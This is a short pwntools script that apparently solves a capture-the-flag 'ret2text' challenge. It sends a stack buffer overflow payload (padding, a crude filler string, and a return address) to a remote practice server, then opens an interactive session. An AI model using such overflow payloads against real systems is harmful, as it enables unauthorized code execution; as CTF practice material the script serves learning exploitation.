from pwn import *

# context(os="linux", arch="amd64", log_level='debug')
# io = process('ret2text')
io = remote('pwn.challenge.ctf.show', 28067)
payload = b'a'*0x80 + b'fuckpwn!' + p64(0x40063B)
io.sendline(payload)
io.interactive()